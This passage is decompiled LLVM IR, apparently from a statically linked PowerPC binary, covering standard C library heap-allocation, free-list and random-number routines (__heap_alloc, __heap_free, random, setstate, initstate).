  %v3_1001f20c = load i32, i32* @global_var_10045234.1005, align 4
  store i32 %v4_1001f204, i32* @r29, align 4
  %v1_1001f214 = inttoptr i32 %v4_1001f204 to i32*
  %v2_1001f214 = load i32, i32* %v1_1001f214, align 4
  store i32 %v2_1001f214, i32* @r27, align 4
  %v1_1001f218 = mul i32 %v3_1001f20c, 8
  %v2_1001f21c = icmp ult i32 %v2_1001f214, %v1_1001f218
  br i1 %v2_1001f21c, label %dec_label_pc_1001f250, label %dec_label_pc_1001f224

dec_label_pc_1001f224:                            ; preds = %dec_label_pc_1001f1dc
  store i32 268763136, i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1004ee20.969 to i32), i32* @r28, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001f238.1239 to i32), i32* @lr, align 4
  %v1_1001f234 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004ee20.969 to i32))
  store i32 268563008, i32* @lr, align 4
  %v1_1001f23c = call i32 @__GI_sbrk(i32 0)
  %v0_1001f240 = load i32, i32* @r31, align 4
  %v4_1001f240 = icmp eq i32 %v0_1001f240, %v1_1001f23c
  br i1 %v4_1001f240, label %dec_label_pc_1001f258, label %dec_label_pc_1001f248

dec_label_pc_1001f248:                            ; preds = %dec_label_pc_1001f224
  %v0_1001f248 = load i32, i32* @r28, align 4
  store i32 %v0_1001f248, i32* @r3, align 4
  store i32 268563024, i32* @lr, align 4
  %v0_1001f24c = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1001f250

dec_label_pc_1001f250:                            ; preds = %dec_label_pc_1001f1dc, %dec_label_pc_1001f248
  %v0_1001f250 = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001f2ac

dec_label_pc_1001f258:                            ; preds = %dec_label_pc_1001f224
  %v0_1001f258 = load i32, i32* @r29, align 4
  %v1_1001f258 = add i32 %v0_1001f258, 4
  %v2_1001f258 = inttoptr i32 %v1_1001f258 to i32*
  %v3_1001f258 = load i32, i32* %v2_1001f258, align 4
  %v3_1001f25c = icmp eq i32 %v3_1001f258, 0
  br i1 %v3_1001f25c, label %dec_label_pc_1001f26c, label %dec_label_pc_1001f264

dec_label_pc_1001f264:                            ; preds = %dec_label_pc_1001f258
  %v1_1001f264 = add i32 %v0_1001f258, 8
  %v2_1001f264 = inttoptr i32 %v1_1001f264 to i32*
  %v3_1001f264 = load i32, i32* %v2_1001f264, align 4
  %v2_1001f268 = add i32 %v3_1001f258, 8
  %v3_1001f268 = inttoptr i32 %v2_1001f268 to i32*
  store i32 %v3_1001f264, i32* %v3_1001f268, align 4
  %v0_1001f26c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001f26c

dec_label_pc_1001f26c:                            ; preds = %dec_label_pc_1001f258, %dec_label_pc_1001f264
  %v0_1001f26c = phi i32 [ %v0_1001f258, %dec_label_pc_1001f258 ], [ %v0_1001f26c.pre, %dec_label_pc_1001f264 ]
  %v1_1001f26c = add i32 %v0_1001f26c, 8
  %v2_1001f26c = inttoptr i32 %v1_1001f26c to i32*
  %v3_1001f26c = load i32, i32* %v2_1001f26c, align 4
  store i32 %v3_1001f26c, i32* @r9, align 4
  %v1_1001f270 = add i32 %v0_1001f26c, 4
  %v2_1001f270 = inttoptr i32 %v1_1001f270 to i32*
  %v3_1001f270 = load i32, i32* %v2_1001f270, align 4
  %v3_1001f274 = icmp eq i32 %v3_1001f26c, 0
  br i1 %v3_1001f274, label %dec_label_pc_1001f284, label %dec_label_pc_1001f27c

dec_label_pc_1001f27c:                            ; preds = %dec_label_pc_1001f26c
  %v2_1001f27c = add i32 %v3_1001f26c, 4
  %v3_1001f27c = inttoptr i32 %v2_1001f27c to i32*
  store i32 %v3_1001f270, i32* %v3_1001f27c, align 4
  br label %dec_label_pc_1001f288

dec_label_pc_1001f284:                            ; preds = %dec_label_pc_1001f26c
  store i32 %v3_1001f270, i32* @global_var_10045130, align 4
  br label %dec_label_pc_1001f288

dec_label_pc_1001f288:                            ; preds = %dec_label_pc_1001f27c, %dec_label_pc_1001f284
  store i32 ptrtoint (i32* @global_var_1004da14.970 to i32), i32* @r3, align 4
  store i32 268563092, i32* @lr, align 4
  %v0_1001f290 = call i32 @pthread_mutex_unlock()
  %v0_1001f294 = load i32, i32* @r27, align 4
  %v1_1001f294 = load i32, i32* @r29, align 4
  %v0_1001f29c = load i32, i32* @r31, align 4
  %v2_1001f294 = sub i32 12, %v0_1001f294
  %v1_1001f298 = add i32 %v2_1001f294, %v1_1001f294
  %v2_1001f29c = sub i32 %v1_1001f298, %v0_1001f29c
  store i32 268563108, i32* @lr, align 4
  %v1_1001f2a0 = call i32 @__GI_sbrk(i32 %v2_1001f29c)
  br label %dec_label_pc_1001f2ac

dec_label_pc_1001f2ac:                            ; preds = %dec_label_pc_1001f250, %dec_label_pc_1001f288
  %storemerge = phi i32 [ %v0_1001f250, %dec_label_pc_1001f250 ], [ ptrtoint (i32* @global_var_1004ee20.969 to i32), %dec_label_pc_1001f288 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268563120, i32* @lr, align 4
  %v0_1001f2ac = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_1001f2b0

dec_label_pc_1001f2b0:                            ; preds = %entry, %dec_label_pc_1001f2ac
  %.0 = phi i32 [ undef, %entry ], [ %v0_1001f2ac, %dec_label_pc_1001f2ac ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1001f26c, { 1, 0 }
  uselistorder i32 undef, { 3, 5, 4, 7, 6, 2, 0, 1, 8, 9, 10, 11 }
  uselistorder i32 (i32)* @__GI_sbrk, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004ee20.969 to i32), { 0, 1, 4, 5, 2, 3, 6 }
  uselistorder label %dec_label_pc_1001f2b0, { 1, 0 }
  uselistorder label %dec_label_pc_1001f2ac, { 1, 0 }
  uselistorder label %dec_label_pc_1001f288, { 1, 0 }
  uselistorder label %dec_label_pc_1001f26c, { 1, 0 }
  uselistorder label %dec_label_pc_1001f250, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1001f2c4 = inttoptr i32 %arg2 to i32*
  %v2_1001f2c4 = load i32, i32* %v1_1001f2c4, align 4
  %v1_1001f2c8 = add i32 %v2_1001f2c4, 3
  %v1_1001f2cc = call i32 @__asm_rlwinm(i32 %v1_1001f2c8, i32 0, i32 0, i32 29)
  %v2_1001f2d0 = icmp ugt i32 %v1_1001f2cc, 11
  br i1 %v2_1001f2d0, label %dec_label_pc_1001f354.preheader, label %dec_label_pc_1001f2d8

dec_label_pc_1001f2d8:                            ; preds = %entry
  br label %dec_label_pc_1001f354.preheader

dec_label_pc_1001f354.preheader:                  ; preds = %entry, %dec_label_pc_1001f2d8
  %storemerge20 = phi i32 [ 12, %dec_label_pc_1001f2d8 ], [ %v1_1001f2cc, %entry ]
  %v0_1001f338 = phi i32 [ 12, %dec_label_pc_1001f2d8 ], [ %v1_1001f2cc, %entry ]
  store i32 %storemerge20, i32* @r11, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* @r9, align 4
  %v3_1001f3545 = icmp eq i32 %storemerge2, 0
  br i1 %v3_1001f3545, label %dec_label_pc_1001f35c, label %dec_label_pc_1001f2e4

dec_label_pc_1001f2e4:                            ; preds = %dec_label_pc_1001f354.preheader, %dec_label_pc_1001f350
  %v0_1001f350 = phi i32 [ %storemerge, %dec_label_pc_1001f350 ], [ %storemerge2, %dec_label_pc_1001f354.preheader ]
  %v1_1001f2e4 = inttoptr i32 %v0_1001f350 to i32*
  %v2_1001f2e4 = load i32, i32* %v1_1001f2e4, align 4
  store i32 %v2_1001f2e4, i32* @r10, align 4
  %v2_1001f2e8 = icmp ult i32 %v2_1001f2e4, %v0_1001f338
  br i1 %v2_1001f2e8, label %dec_label_pc_1001f350, label %dec_label_pc_1001f2f0

dec_label_pc_1001f2f0:                            ; preds = %dec_label_pc_1001f2e4
  %v1_1001f2f0 = add i32 %v0_1001f338, 44
  %v2_1001f2f4 = icmp ult i32 %v2_1001f2e4, %v1_1001f2f0
  br i1 %v2_1001f2f4, label %dec_label_pc_1001f2fc, label %dec_label_pc_1001f338

dec_label_pc_1001f2fc:                            ; preds = %dec_label_pc_1001f2f0
  %v1_1001f2fc = add i32 %v0_1001f350, 4
  %v2_1001f2fc = inttoptr i32 %v1_1001f2fc to i32*
  %v3_1001f2fc = load i32, i32* %v2_1001f2fc, align 4
  %v3_1001f300 = icmp eq i32 %v3_1001f2fc, 0
  br i1 %v3_1001f300, label %dec_label_pc_1001f310, label %dec_label_pc_1001f308

dec_label_pc_1001f308:                            ; preds = %dec_label_pc_1001f2fc
  %v1_1001f308 = add i32 %v0_1001f350, 8
  %v2_1001f308 = inttoptr i32 %v1_1001f308 to i32*
  %v3_1001f308 = load i32, i32* %v2_1001f308, align 4
  %v2_1001f30c = add i32 %v3_1001f2fc, 8
  %v3_1001f30c = inttoptr i32 %v2_1001f30c to i32*
  store i32 %v3_1001f308, i32* %v3_1001f30c, align 4
  %v0_1001f310.pre = load i32, i32* @r9, align 4
  %v0_1001f32c.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1001f310

dec_label_pc_1001f310:                            ; preds = %dec_label_pc_1001f2fc, %dec_label_pc_1001f308
  %v0_1001f32c = phi i32 [ %v2_1001f2e4, %dec_label_pc_1001f2fc ], [ %v0_1001f32c.pre, %dec_label_pc_1001f308 ]
  %v0_1001f310 = phi i32 [ %v0_1001f350, %dec_label_pc_1001f2fc ], [ %v0_1001f310.pre, %dec_label_pc_1001f308 ]
  %v1_1001f310 = add i32 %v0_1001f310, 8
  %v2_1001f310 = inttoptr i32 %v1_1001f310 to i32*
  %v3_1001f310 = load i32, i32* %v2_1001f310, align 4
  store i32 %v3_1001f310, i32* @r8, align 4
  %v1_1001f314 = add i32 %v0_1001f310, 4
  %v2_1001f314 = inttoptr i32 %v1_1001f314 to i32*
  %v3_1001f314 = load i32, i32* %v2_1001f314, align 4
  %v3_1001f318 = icmp eq i32 %v3_1001f310, 0
  store i32 %v0_1001f32c, i32* @r11, align 4
  br i1 %v3_1001f318, label %dec_label_pc_1001f32c, label %dec_label_pc_1001f320

dec_label_pc_1001f320:                            ; preds = %dec_label_pc_1001f310
  %v2_1001f324 = add i32 %v3_1001f310, 4
  %v3_1001f324 = inttoptr i32 %v2_1001f324 to i32*
  store i32 %v3_1001f314, i32* %v3_1001f324, align 4
  br label %dec_label_pc_1001f340

dec_label_pc_1001f32c:                            ; preds = %dec_label_pc_1001f310
  store i32 %v3_1001f314, i32* %arg1, align 4
  br label %dec_label_pc_1001f340

dec_label_pc_1001f338:                            ; preds = %dec_label_pc_1001f2f0
  %v2_1001f338 = sub i32 %v2_1001f2e4, %v0_1001f338
  store i32 %v2_1001f338, i32* %v1_1001f2e4, align 4
  br label %dec_label_pc_1001f340

dec_label_pc_1001f340:                            ; preds = %dec_label_pc_1001f32c, %dec_label_pc_1001f320, %dec_label_pc_1001f338
  %v0_1001f340 = load i32, i32* @r10, align 4
  %v1_1001f340 = load i32, i32* @r9, align 4
  %v2_1001f340 = sub i32 %v1_1001f340, %v0_1001f340
  store i32 %v2_1001f340, i32* @r9, align 4
  %v0_1001f344 = load i32, i32* @r11, align 4
  store i32 %v0_1001f344, i32* %v1_1001f2c4, align 4
  %v0_1001f348 = load i32, i32* @r9, align 4
  %v1_1001f348 = add i32 %v0_1001f348, 12
  ret i32 %v1_1001f348

dec_label_pc_1001f350:                            ; preds = %dec_label_pc_1001f2e4
  %v1_1001f350 = add i32 %v0_1001f350, 4
  %storemerge.in = inttoptr i32 %v1_1001f350 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r9, align 4
  %v3_1001f354 = icmp eq i32 %storemerge, 0
  br i1 %v3_1001f354, label %dec_label_pc_1001f354.dec_label_pc_1001f35c_crit_edge, label %dec_label_pc_1001f2e4

dec_label_pc_1001f354.dec_label_pc_1001f35c_crit_edge: ; preds = %dec_label_pc_1001f350
  br label %dec_label_pc_1001f35c

dec_label_pc_1001f35c:                            ; preds = %dec_label_pc_1001f354.dec_label_pc_1001f35c_crit_edge, %dec_label_pc_1001f354.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1001f310, { 1, 0 }
  uselistorder i32 %v2_1001f2e4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1001f350, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_1001f338, { 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001f340, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001f310, { 1, 0 }
  uselistorder label %dec_label_pc_1001f2e4, { 1, 0 }
  uselistorder label %dec_label_pc_1001f354.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1001f364 = icmp eq i32 %arg3, 0
  %v2_1001f368 = add i32 %arg2, 4
  %v3_1001f368 = inttoptr i32 %v2_1001f368 to i32*
  store i32 %arg4, i32* %v3_1001f368, align 4
  %v2_1001f36c = add i32 %arg2, 8
  %v3_1001f36c = inttoptr i32 %v2_1001f36c to i32*
  store i32 %arg3, i32* %v3_1001f36c, align 4
  br i1 %v3_1001f364, label %dec_label_pc_1001f37c, label %dec_label_pc_1001f374

dec_label_pc_1001f374:                            ; preds = %entry
  %v2_1001f374 = add i32 %arg3, 4
  %v3_1001f374 = inttoptr i32 %v2_1001f374 to i32*
  store i32 %arg2, i32* %v3_1001f374, align 4
  br label %dec_label_pc_1001f380

dec_label_pc_1001f37c:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1001f380

dec_label_pc_1001f380:                            ; preds = %dec_label_pc_1001f374, %dec_label_pc_1001f37c
  %v3_1001f380 = icmp eq i32 %arg4, 0
  %v0_1001f384 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001f380, i32 %v0_1001f384)
  %v2_1001f388 = add i32 %arg4, 8
  %v3_1001f388 = inttoptr i32 %v2_1001f388 to i32*
  store i32 %arg2, i32* %v3_1001f388, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1001f380, { 1, 0 }
}

define i32 @__heap_link_free_area_after(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1001f390 = icmp eq i32 %arg3, 0
  br i1 %v3_1001f390, label %dec_label_pc_1001f3a0, label %dec_label_pc_1001f398

dec_label_pc_1001f398:                            ; preds = %entry
  %v2_1001f398 = add i32 %arg3, 4
  %v3_1001f398 = inttoptr i32 %v2_1001f398 to i32*
  store i32 %arg2, i32* %v3_1001f398, align 4
  br label %dec_label_pc_1001f3a4

dec_label_pc_1001f3a0:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1001f3a4

dec_label_pc_1001f3a4:                            ; preds = %dec_label_pc_1001f398, %dec_label_pc_1001f3a0
  %v2_1001f3a4 = add i32 %arg2, 8
  %v3_1001f3a4 = inttoptr i32 %v2_1001f3a4 to i32*
  store i32 %arg3, i32* %v3_1001f3a4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001f3a4, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r10, align 4
  store i32 0, i32* @r11, align 4
  %v2_1001f3c4 = load i32, i32* %arg1, align 4
  store i32 %v2_1001f3c4, i32* @r31, align 4
  %v2_1001f3c8 = add i32 %arg3, %arg2
  store i32 %v2_1001f3c8, i32* %r3.global-to-local, align 4
  %v3_1001f3dc7 = icmp eq i32 %v2_1001f3c4, 0
  %v1_1001f3e08 = add i32 %v2_1001f3c4, 12
  %tmp69 = icmp uge i32 %v1_1001f3e08, %arg2
  %or.cond10 = or i1 %v3_1001f3dc7, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1001f3ec, label %dec_label_pc_1001f3d4

dec_label_pc_1001f3d4:                            ; preds = %entry, %dec_label_pc_1001f3d4
  %v0_1001f43411 = phi i32 [ %v3_1001f3d8, %dec_label_pc_1001f3d4 ], [ %v2_1001f3c4, %entry ]
  store i32 %v0_1001f43411, i32* @r11, align 4
  %v1_1001f3d8 = add i32 %v0_1001f43411, 4
  %v2_1001f3d8 = inttoptr i32 %v1_1001f3d8 to i32*
  %v3_1001f3d8 = load i32, i32* %v2_1001f3d8, align 4
  store i32 %v3_1001f3d8, i32* @r31, align 4
  %v3_1001f3dc = icmp eq i32 %v3_1001f3d8, 0
  %v1_1001f3e0 = add i32 %v3_1001f3d8, 12
  %tmp6 = icmp uge i32 %v1_1001f3e0, %arg2
  %or.cond = or i1 %v3_1001f3dc, %tmp6
  br i1 %or.cond, label %dec_label_pc_1001f3ec, label %dec_label_pc_1001f3d4

dec_label_pc_1001f3ec:                            ; preds = %dec_label_pc_1001f3d4, %entry
  %v0_1001f428.lcssa = phi i32 [ 0, %entry ], [ %v0_1001f43411, %dec_label_pc_1001f3d4 ]
  %v0_1001f434.lcssa = phi i32 [ %v2_1001f3c4, %entry ], [ %v3_1001f3d8, %dec_label_pc_1001f3d4 ]
  %v3_1001f3dc.lcssa = phi i1 [ %v3_1001f3dc7, %entry ], [ %v3_1001f3dc, %dec_label_pc_1001f3d4 ]
  br i1 %v3_1001f3dc.lcssa, label %dec_label_pc_1001f4a4, label %dec_label_pc_1001f3f4

dec_label_pc_1001f3f4:                            ; preds = %dec_label_pc_1001f3ec
  %v1_1001f3f4 = inttoptr i32 %v0_1001f434.lcssa to i32*
  %v2_1001f3f4 = load i32, i32* %v1_1001f3f4, align 4
  %v2_1001f3f8 = sub i32 %v0_1001f434.lcssa, %v2_1001f3f4
  %v1_1001f3fc = add i32 %v2_1001f3f8, 12
  store i32 %v1_1001f3fc, i32* @r9, align 4
  %v3_1001f400 = icmp ugt i32 %v1_1001f3fc, %v2_1001f3c8
  br i1 %v3_1001f400, label %dec_label_pc_1001f4a4, label %dec_label_pc_1001f408

dec_label_pc_1001f408:                            ; preds = %dec_label_pc_1001f3f4
  %v4_1001f400 = icmp eq i32 %v1_1001f3fc, %v2_1001f3c8
  %v2_1001f40c = add i32 %v2_1001f3f4, %arg3
  store i32 %v2_1001f40c, i32* @r29, align 4
  br i1 %v4_1001f400, label %dec_label_pc_1001f414, label %dec_label_pc_1001f444

dec_label_pc_1001f414:                            ; preds = %dec_label_pc_1001f408
  %v3_1001f414 = icmp eq i32 %v0_1001f428.lcssa, 0
  br i1 %v3_1001f414, label %dec_label_pc_1001f498, label %dec_label_pc_1001f41c

dec_label_pc_1001f41c:                            ; preds = %dec_label_pc_1001f414
  %v1_1001f41c = add i32 %v0_1001f428.lcssa, 12
  %v4_1001f420 = icmp eq i32 %v1_1001f41c, %arg2
  br i1 %v4_1001f420, label %dec_label_pc_1001f428, label %dec_label_pc_1001f498

dec_label_pc_1001f428:                            ; preds = %dec_label_pc_1001f41c
  %v1_1001f428 = inttoptr i32 %v0_1001f428.lcssa to i32*
  %v2_1001f428 = load i32, i32* %v1_1001f428, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1001f430 = add i32 %v0_1001f428.lcssa, 8
  %v2_1001f430 = inttoptr i32 %v1_1001f430 to i32*
  %v3_1001f430 = load i32, i32* %v2_1001f430, align 4
  %v2_1001f438 = add i32 %v2_1001f428, %v2_1001f40c
  store i32 %v2_1001f438, i32* @r29, align 4
  %v5_1001f43c = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_1001f434.lcssa, i32 %v3_1001f430, i32 %v2_1001f3c8)
  store i32 %v5_1001f43c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f498

dec_label_pc_1001f444:                            ; preds = %dec_label_pc_1001f408
  %v1_1001f444 = add i32 %v0_1001f434.lcssa, 4
  %v2_1001f444 = inttoptr i32 %v1_1001f444 to i32*
  %v3_1001f444 = load i32, i32* %v2_1001f444, align 4
  %v3_1001f448 = icmp eq i32 %v3_1001f444, 0
  br i1 %v3_1001f448, label %dec_label_pc_1001f480, label %dec_label_pc_1001f450

dec_label_pc_1001f450:                            ; preds = %dec_label_pc_1001f444
  %v1_1001f450 = inttoptr i32 %v3_1001f444 to i32*
  %v2_1001f450 = load i32, i32* %v1_1001f450, align 4
  %v2_1001f454 = sub i32 %v3_1001f444, %v2_1001f450
  %v1_1001f458 = add i32 %v2_1001f454, 12
  store i32 %v1_1001f458, i32* @r9, align 4
  %v4_1001f45c = icmp eq i32 %v2_1001f3c8, %v1_1001f458
  br i1 %v4_1001f45c, label %dec_label_pc_1001f464, label %dec_label_pc_1001f480

dec_label_pc_1001f464:                            ; preds = %dec_label_pc_1001f450
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1001f470 = add i32 %v2_1001f450, %v2_1001f40c
  store i32 %v2_1001f470, i32* @r29, align 4
  store i32 %v3_1001f444, i32* @r31, align 4
  %v5_1001f478 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_1001f444, i32 %v0_1001f428.lcssa, i32 %v2_1001f3c8)
  store i32 %v5_1001f478, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f498

dec_label_pc_1001f480:                            ; preds = %dec_label_pc_1001f450, %dec_label_pc_1001f444
  %v2_1001f480 = add i32 %v0_1001f434.lcssa, %arg3
  store i32 %v2_1001f480, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268563608, i32* @lr, align 4
  %v5_1001f494 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1001f480, i32 %v0_1001f428.lcssa, i32 %v3_1001f444)
  store i32 %v5_1001f494, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f498

dec_label_pc_1001f498:                            ; preds = %dec_label_pc_1001f41c, %dec_label_pc_1001f414, %dec_label_pc_1001f464, %dec_label_pc_1001f428, %dec_label_pc_1001f480
  %v0_1001f498 = load i32, i32* @r31, align 4
  store i32 %v0_1001f498, i32* @r30, align 4
  %v0_1001f49c = load i32, i32* @r29, align 4
  %v2_1001f49c = inttoptr i32 %v0_1001f498 to i32*
  store i32 %v0_1001f49c, i32* %v2_1001f49c, align 4
  br label %dec_label_pc_1001f4c0

dec_label_pc_1001f4a4:                            ; preds = %dec_label_pc_1001f3f4, %dec_label_pc_1001f3ec
  %v2_1001f4a4 = add i32 %v2_1001f3c8, -12
  %v3_1001f4a4 = inttoptr i32 %v2_1001f4a4 to i32*
  store i32 %arg3, i32* %v3_1001f4a4, align 4
  %v0_1001f4a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001f4a8 = add i32 %v0_1001f4a8, -12
  store i32 %v1_1001f4a8, i32* @r30, align 4
  %v0_1001f4ac = load i32, i32* @r11, align 4
  %v0_1001f4b0 = load i32, i32* @r10, align 4
  store i32 %v0_1001f4b0, i32* %r3.global-to-local, align 4
  %v0_1001f4b4 = load i32, i32* @r31, align 4
  store i32 268563648, i32* @lr, align 4
  %v4_1001f4bc = inttoptr i32 %v0_1001f4b0 to i32*
  %v5_1001f4bc = call i32 @__heap_link_free_area(i32* %v4_1001f4bc, i32 %v1_1001f4a8, i32 %v0_1001f4ac, i32 %v0_1001f4b4)
  store i32 %v5_1001f4bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001f4c0

dec_label_pc_1001f4c0:                            ; preds = %dec_label_pc_1001f498, %dec_label_pc_1001f4a4
  %v0_1001f4c4 = load i32, i32* @r30, align 4
  store i32 %v0_1001f4c4, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001f4c4

; uselistorder directives
  uselistorder i32 %v3_1001f444, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1001f3fc, { 1, 0, 2 }
  uselistorder i32 %v0_1001f434.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1001f428.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1001f3d8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1001f3c8, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 1, 6, 10, 2, 7, 4, 8, 3, 9, 11, 0 }
  uselistorder i32 -12, { 6, 7, 1, 5, 8, 2, 3, 0, 4 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1001f4c0, { 1, 0 }
  uselistorder label %dec_label_pc_1001f498, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1001f3d4, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_1001f4d8 = call i32 @random()
  ret i32 %v0_1001f4d8

; uselistorder directives
  uselistorder i32 ()* @random, { 36, 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 31, 32, 34, 35, 30, 33, 29 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1001f4f4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1001f4f4, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10044f68.1242 to i32), i32* @r29, align 4
  %v4_1001f508 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 268527832, i32 ptrtoint (i32* @global_var_10044f68.1242 to i32))
  %v0_1001f50c = load i32, i32* @r29, align 4
  store i32 268563732, i32* @lr, align 4
  %v1_1001f510 = call i32 @pthread_mutex_lock(i32 %v0_1001f50c)
  %v2_1001f518 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1001f520 = call i32 @__GI_random_r(i32* inttoptr (i32 268717952 to i32*), i32 %v2_1001f518)
  store i32 %v2_1001f4f4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268563760, i32* @lr, align 4
  %v0_1001f52c = call i32 @__pthread_cleanup_pop_restore()
  %v3_1001f534 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1001f534
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001f56c = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001f574 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_10044f68.1242 to i32))
  store i32 0, i32* @r29, align 4
  store i32 268563844, i32* @lr, align 4
  %v1_1001f580 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044f68.1242 to i32))
  store i32 268563868, i32* @lr, align 4
  %v3_1001f598 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_10044f80)
  store i32 1, i32* @r4, align 4
  %v1_1001f5a0 = icmp slt i32 %v3_1001f598, 0
  store i32 %v2_1001f56c, i32* @r3, align 4
  br i1 %v1_1001f5a0, label %dec_label_pc_1001f5b0, label %dec_label_pc_1001f5ac

dec_label_pc_1001f5ac:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_10044f84.1246 to i32), i32* @r29, align 4
  br label %dec_label_pc_1001f5b0

dec_label_pc_1001f5b0:                            ; preds = %entry, %dec_label_pc_1001f5ac
  store i32 268563892, i32* @lr, align 4
  %v0_1001f5b0 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001f5b8 = load i32, i32* @r29, align 4
  ret i32 %v0_1001f5b8

; uselistorder directives
  uselistorder label %dec_label_pc_1001f5b0, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1001f5dc = ptrtoint i32* %stack_var_-56 to i32
  %v4_1001f604 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268527832, i32 ptrtoint (i32* @global_var_10044f68.1242 to i32))
  store i32 268563984, i32* @lr, align 4
  %v1_1001f60c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044f68.1242 to i32))
  store i32 %arg1, i32* @r3, align 4
  store i32 268564012, i32* @lr, align 4
  %v4_1001f628 = inttoptr i32 %arg1 to i32*
  %v5_1001f628 = call i32 @__GI_initstate_r(i32* %v4_1001f628, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_10044f80 to i32))
  store i32 %v2_1001f5dc, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268564024, i32* @lr, align 4
  %v0_1001f634 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 ptrtoint (i32** @global_var_10044f84.1246 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

